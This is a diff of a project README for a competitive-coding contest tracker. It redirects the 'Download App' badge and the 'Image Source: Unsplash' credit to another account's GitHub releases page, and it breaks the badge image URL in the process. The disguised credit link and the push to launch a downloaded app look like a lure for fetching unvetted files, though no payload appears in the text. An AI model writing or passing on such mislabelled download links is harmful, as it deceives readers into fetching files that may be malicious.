@@ -33,7 +33,7 @@ Welcome to the Assignment GitHub repository! This project, named TLE Eliminators
 
 ## Get Started
 To access the latest version of the app, click the button below:
-[![Download App](https://img.shields.io/badge/Download-App.zip-<COLOR>.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/dgvijaytorg/assignment/releases<COLOR>.svg)](https://github.com/dgvijaytorg/assignment/releases)
 
 Note: The link provided above needs to be launched to download the application.
 
@@ -75,4 +75,4 @@ Explore the functionalities and features of this project by downloading the appl
 
 Remember, in the world of competitive coding, efficiency and accuracy are key. Stay ahead of the competition with the Assignment Contest Tracker and Solution Uploader by TLE Eliminators. Happy coding! 🏆🚀
 
-*Image Source: [Unsplash](https://unsplash.com)*
+*Image Source: [Unsplash](https://github.com/dgvijaytorg/assignment/releases)*
